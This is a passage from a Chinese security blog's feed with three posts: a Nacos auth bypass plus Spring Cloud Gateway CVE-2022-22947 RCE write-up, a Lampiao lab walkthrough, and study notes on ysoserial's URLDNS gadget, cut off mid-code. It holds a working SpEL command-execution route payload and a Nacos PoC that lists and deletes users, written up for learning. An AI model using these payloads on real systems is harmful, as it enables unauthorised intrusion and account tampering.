class="hljs-string">/nacos/v1/auth/users/?pageNo=1&amp;pageSize=999</span><br>            <span class="hljs-attr">headers:</span><br>                <span class="hljs-attr">User-Agent:</span> <span class="hljs-string">Nacos-Server</span><br>        <span class="hljs-attr">expression:</span> <span class="hljs-string">response.status</span> <span class="hljs-string">==</span> <span class="hljs-number">200</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">response.body.bcontains(bytes(r1))</span><br>    <span class="hljs-attr">r2:</span><br>        <span class="hljs-attr">request:</span><br>            <span class="hljs-attr">cache:</span> <span class="hljs-literal">true</span><br>            <span class="hljs-attr">method:</span> <span class="hljs-string">DELETE</span><br>            <span class="hljs-attr">path:</span> <span class="hljs-string">/nacos/v1/auth/users/?username=&#123;&#123;r1&#125;&#125;</span><br>            <span class="hljs-attr">headers:</span><br>                <span class="hljs-attr">User-Agent:</span> <span class="hljs-string">Nacos-Server</span><br>        <span class="hljs-comment"># 不需要判断这个条件</span><br>        <span class="hljs-attr">expression:</span> <span class="hljs-string">&quot;true&quot;</span><br><span class="hljs-attr">expression:</span> <span class="hljs-string">r0()</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">r1()</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">r2()</span><br><span class="hljs-attr">detail:</span><br>    <span class="hljs-attr">author:</span> <span class="hljs-string">kmahyyg(https://github.com/kmahyyg)</span><br>    <span class="hljs-attr">links:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">https://github.com/alibaba/nacos/issues/4593</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">https://github.com/alibaba/nacos/issues/4701</span><br>    <span class="hljs-attr">vulnerability:</span><br>        <span class="hljs-attr">id:</span> <span class="hljs-string">CT-153900</span><br></code></pre></td></tr></table></figure><h3 id="4-漏洞原理"><a href="#4-漏洞原理" class="headerlink" title="4. 漏洞原理"></a>4. 漏洞原理</h3><h4 id="Spring-Cloud-Gateway"><a href="#Spring-Cloud-Gateway" class="headerlink" title="Spring Cloud Gateway"></a>Spring Cloud Gateway</h4><p><code>Spring Cloud Gateway</code>提供了一种灵活而强大的方式来路由和过滤传入的请求，使开发人员能够构建高度可定制的API网关。它可以用作传统的反向代理，也可以用于实现更复杂的路由规则和过滤器链</p><ol><li>路由功能：根据请求的URL路径将请求路由到相应的服务。它支持动态路由，可以根据配置或服务注册中心的信息动态调整路由规则</li><li>过滤器功能：Spring Cloud Gateway提供了一系列内置的过滤器，用于对请求和响应进行处理</li><li>监控和指标：通过集成Spring Boot Actuator和其他监控工具来实时监控网关的性能和健康状况</li></ol><p>虽然说它还有很多其他功能，如负载均衡，断路器支持，但都不在我们讨论范围之内，值得一提的是Actuator，这是利用它来进行RCE的核心，需要nacos配合它主要就是因为它一般不在公网上开放</p><h4 id="Nacos"><a href="#Nacos" class="headerlink" title="Nacos"></a>Nacos</h4><p><code>Nacos</code>可以理解为一个统一管理的配置注册中心，配置了nacos后，项目中的配置文件便可以通过Nacos来动态修改。应用通过注册到Nacos中，然后绑定组和dataID的形式，来绑定Nacos上创建的动态配置文件，当Nacos上所绑定的配置文件发布了新版时，应用将从Nacos中自动同步新的配置，大大增加了灵活性</p><h4 id="CVE-2022-22947"><a href="#CVE-2022-22947" class="headerlink" title="CVE-2022-22947"></a>CVE-2022-22947</h4><p>该漏洞在网上公开POC的利用方式是通过<code>/actuator/gateway/routes</code>这个节点进行动态添加路由的，当项目配置文件中配置了以下两行配置时（YAML格式），便会开启该接口：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">management.endpoint.gateway.enabled</span>: <span class="hljs-string">true</span><br><span class="hljs-attr">management.endpoints.web.exposure.include</span>: <span class="hljs-string">gateway</span><br></code></pre></td></tr></table></figure><p>其中发送的添加路由的数据包中的数据段如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml">&#123;<br>  <span class="hljs-attr">&quot;id&quot;:</span> <span class="hljs-string">&quot;test&quot;</span>,<br>  <span class="hljs-attr">&quot;filters&quot;:</span> [&#123;<br>    <span class="hljs-attr">&quot;name&quot;:</span> <span class="hljs-string">&quot;AddResponseHeader&quot;</span>,<br>    <span class="hljs-attr">&quot;args&quot;:</span> &#123;<span class="hljs-attr">&quot;name&quot;:</span> <span class="hljs-string">&quot;Result&quot;</span>,<span class="hljs-attr">&quot;value&quot;:</span> <span class="hljs-string">&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;</span>&#125;<br>  &#125;],<br><span class="hljs-attr">&quot;uri&quot;:</span> <span class="hljs-string">&quot;http://example.com&quot;</span>,<br><span class="hljs-attr">&quot;order&quot;:</span> <span class="hljs-number">0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>通过POST请求任意一个路由，携带上这个数据段</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529150007041.png" alt="image-20230529150007041"></p><p>刷新路由</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529150122608.png" alt="image-20230529150122608"></p><p>请求刚刚添加的路由</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529150102933.png" alt="image-20230529150102933"></p><p>我们可以先理解一下这段POC的含义，其中id字段代表的是路由的ID标识，而filters则是Spring Cloud Gateway中路由配置的过滤器，这里指定了过滤器<code>AddResponseHeader</code>，含义为对匹配到的请求的响应包中添加一个自定义的Header，其中名称为 Result，值为该漏洞利用的SpEL表达式，执行了命令<code>id</code>，也就是说当一个请求匹配到该路由时，返回包中应该会存在一个Header返回了我们定义的键值，利用成功的话会得到：<code>result: uid=0(root) gid=0（...）</code></p><p>但POC中并未定义路由的匹配规则，因为开启actuator&#x2F;gateway的话需要刷新一下路由然后直接查看路由配置就可以得到命令执行的回显了。为了验证，需要添加一条路由规则如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs yaml">&#123;<br>    <span class="hljs-attr">&quot;id&quot;:</span> <span class="hljs-string">&quot;test&quot;</span>,<br>    <span class="hljs-attr">&quot;order&quot;:</span> <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;predicates&quot;:</span> [<br>      &#123;<br>        <span class="hljs-attr">&quot;args&quot;:</span> &#123;<br>          <span class="hljs-attr">&quot;_genkey_0&quot;:</span> <span class="hljs-string">&quot;/test/**&quot;</span><br>        &#125;,<br>        <span class="hljs-attr">&quot;name&quot;:</span> <span class="hljs-string">&quot;Path&quot;</span><br>      &#125;<br>    ],<span class="hljs-attr">&quot;filters&quot;:</span> [<br>&#123;<br>    <span class="hljs-attr">&quot;name&quot;:</span> <span class="hljs-string">&quot;AddResponseHeader&quot;</span>,<br>    <span class="hljs-attr">&quot;args&quot;:</span> &#123;<br><span class="hljs-string">&quot;name&quot;</span><span class="hljs-string">:&quot;result&quot;</span>,<span class="hljs-attr">&quot;value&quot;:</span> <span class="hljs-string">&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;id\&quot;&#125;).getInputStream())).replaceAll(\&quot;\n\&quot;,\&quot;\&quot;).replaceAll(\&quot;\r\&quot;,\&quot;\&quot;)&#125;&quot;</span>&#125;<br>  &#125;],<br>    <span class="hljs-attr">&quot;uri&quot;:</span> <span class="hljs-string">&quot;http://example.com&quot;</span><br>  &#125;<br></code></pre></td></tr></table></figure><p>比较可惜的是vulhub是写死了默认路由，只要收到的是Get请求一律转到example这个网站，而且优先级是最高的，所以创建的&#x2F;test路由不起作用</p><p>正常情况下请求<code>/test/</code>的话应当会在请求头里面带上<code>restlt: 回显信息</code> </p><p>比如：</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230529151053495.png" alt="image-20230529151053495"></p><h4 id="CNVD-2023-17316-1"><a href="#CNVD-2023-17316-1" class="headerlink" title="CNVD-2023-17316"></a>CNVD-2023-17316</h4><p>它的主要原因是默认配置下未对<code>token.secret.key</code>进行修改，导致远程攻击者可以通过使用默认的key生成token绕过认证进入后台</p><p>这个和shiro的反序列化漏洞很相似</p><h4 id="CVE-2021-29441"><a href="#CVE-2021-29441" class="headerlink" title="CVE-2021-29441"></a>CVE-2021-29441</h4><p>在 1.4.1 及更早版本的Nacos中，当配置为使用身份验证（Dnacos.core.auth.enabled&#x3D;true）时，会使用 AuthFilter servlet过滤器来强制实施身份验证，从而跳过身份验证检查。此机制依赖于用户代理 HTTP 标头，因此很容易被欺骗。此问题可能允许任何用户在 Nacos 服务器上执行任何管理任务。</p><h3 id="5-Reference"><a href="#5-Reference" class="headerlink" title="5. Reference"></a>5. Reference</h3><h4 id="Blog-amp-Notes"><a href="#Blog-amp-Notes" class="headerlink" title="Blog&amp;Notes"></a>Blog&amp;Notes</h4><p>Nacos结合Spring Cloud Gateway RCE利用</p><p><a href="https://xz.aliyun.com/t/11493">https://xz.aliyun.com/t/11493</a></p><p>xray&#x2F;alibaba-nacos-v1-auth-bypass.yml</p><p><a href="https://github.com/chaitin/xray/blob/master/pocs/alibaba-nacos-v1-auth-bypass.yml">https://github.com/chaitin/xray/blob/master/pocs/alibaba-nacos-v1-auth-bypass.yml</a></p><p>CVE-2022-22947 远程代码执行漏洞复现分析</p><p><a href="https://www.freebuf.com/vuls/324386.html">https://www.freebuf.com/vuls/324386.html</a></p><p>Nacos 身份认证绕过漏洞</p><p><a href="https://blog.csdn.net/qq_50854662/article/details/129660330">https://blog.csdn.net/qq_50854662/article/details/129660330</a></p><p>CVE-2021-29441</p><p><a href="https://wiki.hgsec.top/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%BA%93/Nacos/CVE-2021-29441%20Nacos%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/">https://wiki.hgsec.top/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%BA%93/Nacos/CVE-2021-29441%20Nacos%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</a></p><p>Report a security vulnerability in nacos to bypass authentication</p><p><a href="https://github.com/alibaba/nacos/issues/4593">https://github.com/alibaba/nacos/issues/4593</a></p><p><a href="https://github.com/alibaba/nacos/issues/4701">https://github.com/alibaba/nacos/issues/4701</a></p><p><a href="https://securitylab.github.com/advisories/GHSL-2020-325_326-nacos/">https://securitylab.github.com/advisories/GHSL-2020-325_326-nacos/</a></p><p>Nacos Client Yaml反序列化漏洞分析</p><p><a href="https://xz.aliyun.com/t/10355">https://xz.aliyun.com/t/10355</a></p><p><a href="https://github.com/alibaba/spring-cloud-alibaba/issues/1910">https://github.com/alibaba/spring-cloud-alibaba/issues/1910</a></p>]]></content>
    
    
    <categories>
      
      <category>实战</category>
      
    </categories>
    
    
    <tags>
      
      <tag>实战</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lampiao-Walkthrouth</title>
    <link href="/2023/05/06/Lampiao-Walkthrouth/"/>
    <url>/2023/05/06/Lampiao-Walkthrouth/</url>
    
    <content type="html"><![CDATA[<h4 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h4><h5 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h5><p>目标ip为192.168.247.48</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230506103944373.png" alt="image-20230506103944373"></p><h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230506104303702.png" alt="image-20230506104303702"></p><h5 id="服务识别"><a href="#服务识别" class="headerlink" title="服务识别"></a>服务识别</h5><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230506104455338.png" alt="image-20230506104455338"></p><h4 id="2-简单漏扫"><a href="#2-简单漏扫" class="headerlink" title="2. 简单漏扫"></a>2. 简单漏扫</h4><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230506121927574.png" alt="image-20230506121927574"></p><p>并没有什么有价值的信息</p><h4 id="3-Web信息收集"><a href="#3-Web信息收集" class="headerlink" title="3. Web信息收集"></a>3. Web信息收集</h4><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230506122816213.png" alt="image-20230506122816213"></p><p>很熟悉的页面 一看又是熟悉的cms</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230506122836275.png" alt="image-20230506122836275"></p><h4 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4. 漏洞利用"></a>4. 漏洞利用</h4><p>msf梭哈</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230506123448826.png" alt="image-20230506123448826"></p><p>弹个shell出来拿到第一个flag</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230506124356392.png" alt="image-20230506124356392"></p><h4 id="5-权限提升"><a href="#5-权限提升" class="headerlink" title="5. 权限提升"></a>5. 权限提升</h4><p>linpeas扫了一遍发现最推荐的竟然是内核提权</p><p>一个个试洛</p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20230506131906360.png" alt="image-20230506131906360"></p><p>用40847.cpp成功提权</p><h4 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h4><p>没什么好说的…内核提权虽然简单但是得一个个尝试poc 有点难搞</p>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSCP</tag>
      
      <tag>打靶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaSecNotes-初识Gadget</title>
    <link href="/2023/05/05/JavaSecNotes-%E5%88%9D%E8%AF%86Gadget/"/>
    <url>/2023/05/05/JavaSecNotes-%E5%88%9D%E8%AF%86Gadget/</url>
    
    <content type="html"><![CDATA[<h3 id="1-背景"><a href="#1-背景" class="headerlink" title="1. 背景"></a>1. 背景</h3><hr><p>从<code>URLDNS</code>开始学习Java反序列化，如果从<code>CommonsCollections</code>链开始，未免太复杂了，作为初学者P神建议。</p><h3 id="2-Ysoserial"><a href="#2-Ysoserial" class="headerlink" title="2. Ysoserial"></a>2. Ysoserial</h3><hr><p><strong>A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.</strong></p><p>从<a href="https://github.com/frohoff/ysoserial">ysoserial</a>的官方文档中可以知道，这个工具是一个针对不安全的Java类的反序列化Poc生成工具。</p><p>反序列化漏洞在各个语⾔里本不是⼀个新鲜的名词，但2015年Gabriel Lawrence (@gebl)和Chris Frohoff (@frohoff)在AppSecCali上提出了了利用Apache Commons Collections来构造命令执⾏的利⽤链，并在年底因为对Weblogic、JBoss、Jenkins等著名应⽤的利用，⼀石激起千层浪，彻底打开了一⽚ Java安全的蓝海海。</p><p>⽽ysoserial就是两位原作者在此议题中释出的⼀个工具，它可以让⽤户根据自⼰选择的利用链，⽣成反序列化利用数据，通过将这些数据发送给目标，从⽽执⾏用户预先定义的命令。</p><p>什么是利用链？利⽤链也叫“gadget chains”，我们通常称为gadget。可以理解为gadget就是⼀种⽣成POC的⽅法。</p><p>ysoserial的使⽤也很简单，虽然我们暂时先不理解<code>CommonsCollections</code>，但是用ysoserial可以很容易地⽣成这个gadget对应的POC。</p><p><code>java-jar ysoserial-master-30099844c6-1.jar CommonsCollections1 &quot;id&quot;</code></p><p>如上，ysoserial大部分的gadget的参数就是一条命令，比如这里是<code>id</code>，生成好的POC发送给目标，如果目标存在反序列化漏洞，并满足这个gadget对应的条件，则命令<code>id</code>将被执行。</p><h3 id="3-URLDNS"><a href="#3-URLDNS" class="headerlink" title="3. URLDNS"></a>3. URLDNS</h3><hr><p><code>URLDNS</code>是ysoserial其中的一个利用链，但是它的参数不是一个可以利用的命令，而是作为一个URL，其能触发的结果不是命令执行，而是一次DNS请求。</p><p>虽然它不能被利用，但是它适合我们在检测反序列化漏洞时使用。</p><ul><li>Java内置类构造，不需要依赖于第三方库</li><li>在目标没有回显的时候，可以通过DNS请求是否存在反序列化漏洞</li></ul><p>参考<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">URLDNS.java</a>看看它是如何生成<code>URLDNS</code>的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.payloads;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.URLConnection;<br><span class="hljs-keyword">import</span> java.net.URLStreamHandler;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">import</span> ysoserial.payloads.annotation.Authors;<br><span class="hljs-keyword">import</span> ysoserial.payloads.annotation.Dependencies;<br><span class="hljs-keyword">import</span> ysoserial.payloads.annotation.PayloadTest;<br><span class="hljs-keyword">import</span> ysoserial.payloads.util.PayloadRunner;<br><span class="hljs-keyword">import</span> ysoserial.payloads.util.Reflections;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * A blog post with more details about this gadget chain is at the url below:</span><br><span class="hljs-comment"> *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   This was inspired by  Philippe Arteau <span class="hljs-doctag">@h</span>3xstream, who wrote a blog</span><br><span class="hljs-comment"> *   posting describing how he modified the Java Commons Collections gadget</span><br><span class="hljs-comment"> *   in ysoserial to open a URL. This takes the same idea, but eliminates</span><br><span class="hljs-comment"> *   the dependency on Commons Collections and does a DNS lookup with just</span><br><span class="hljs-comment"> *   standard JDK classes.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   The Java URL class has an interesting property on its equals and</span><br><span class="hljs-comment"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span><br><span class="hljs-comment"> *   during a comparison (either equals or hashCode).</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   As part of deserialization, HashMap calls hashCode on each key that it</span><br><span class="hljs-comment"> *   deserializes, so using a Java URL object as a serialized key allows</span><br><span class="hljs-comment"> *   it to trigger a DNS lookup.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   Gadget Chain:</span><br><span class="hljs-comment"> *     HashMap.readObject()</span><br><span class="hljs-comment"> *       HashMap.putVal()</span><br><span class="hljs-comment"> *         HashMap.hash()</span><br><span class="hljs-comment"> *           URL.hashCode()</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span><br><span class="hljs-meta">@PayloadTest(skip = &quot;true&quot;)</span><br><span class="hljs-meta">@Dependencies()</span><br><span class="hljs-meta">@Authors(&#123; Authors.GEBL &#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNS</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectPayload</span>&lt;Object&gt; &#123;<br><br>        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String url)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>                <span class="hljs-comment">//Avoid DNS resolution during payload creation</span><br>                <span class="hljs-comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span><br>                <span class="hljs-type">URLStreamHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SilentURLStreamHandler</span>();<br><br>                <span class="hljs-type">HashMap</span> <span class="hljs-variable">ht</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(); <span class="hljs-comment">// HashMap that will contain the URL</span><br>                <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-literal">null</span>, url, handler); <span class="hljs-comment">// URL to use as the Key</span><br>                ht.put(u, url); <span class="hljs-comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><br>                Reflections.setFieldValue(u, <span class="hljs-string">&quot;hashCode&quot;</span>, -<span class="hljs-number">1</span>); <span class="hljs-comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span><br><br>                <span class="hljs-keyword">return</span> ht;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>                PayloadRunner.run(URLDNS.class, args);<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span><br><span class="hljs-comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span><br><span class="hljs-comment">         * using the serialized object.&lt;/p&gt;</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span><br><span class="hljs-comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span><br><span class="hljs-comment">         * second resolution.&lt;/p&gt;</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SilentURLStreamHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">URLStreamHandler</span> &#123;<br><br>                <span class="hljs-keyword">protected</span> URLConnection <span class="hljs-title function_">openConnection</span><span class="hljs-params">(URL u)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br><br>                <span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title function_">getHostAddress</span><span class="hljs-params">(URL u)</span> &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>代码比较简单，来分析一下。</p><h3 id="4-利用链分析"><a href="#4-利用链分析" class="headerlink" title="4. 利用链分析"></a>4. 利用链分析</h3><hr><p>在<code>URLDNS</code>类的<code>getObject</code>方法，ysoserial会调用这个方法获得Paylaod。这个⽅法返回的是一个对象，这个对象就是最后将被序列化的对象，在这里是<code>HashMap</code>。</p><p>触发反序列化的方法往往是<code>readObject()</code>，因为Java开发者（包括内置库的开发者）经常在这里面写自己的逻辑，所以导致可以构造利用链。</p><p>所以我直接找<code>readObject()</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Reconstitutes this map from a stream (that is, deserializes it).</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> s the stream</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> ClassNotFoundException if the class of a serialized object</span><br><span class="hljs-comment">     *         could not be found</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IOException if an I/O error occurs</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br><br>        ObjectInputStream.<span class="hljs-type">GetField</span> <span class="hljs-variable">fields</span> <span class="hljs-operator">=</span> s.readFields();<br><br>        <span class="hljs-comment">// Read loadFactor (ignore threshold)</span><br>        <span class="hljs-type">float</span> <span class="hljs-variable">lf</span> <span class="hljs-operator">=</span> fields.get(<span class="hljs-string">&quot;loadFactor&quot;</span>, <span class="hljs-number">0.75f</span>);<br>        <span class="hljs-keyword">if</span> (lf &lt;= <span class="hljs-number">0</span> || Float.isNaN(lf))<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal load factor: &quot;</span> + lf);<br><br>        lf = Math.min(Math.max(<span class="hljs-number">0.25f</span>, lf), <span class="hljs-number">4.0f</span>);<br>        HashMap.UnsafeHolder.putLoadFactor(<span class="hljs-built_in">this</span>, lf);<br><br>        reinitialize();<br><br>        s.readInt();                <span class="hljs-comment">// Read and ignore number of buckets</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">mappings</span> <span class="hljs-operator">=</span> s.readInt(); <span class="hljs-comment">// Read number of mappings (size)</span><br>        <span class="hljs-keyword">if</span> (mappings &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal mappings count: &quot;</span> + mappings);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-comment">// use defaults</span><br>        &#125; <span 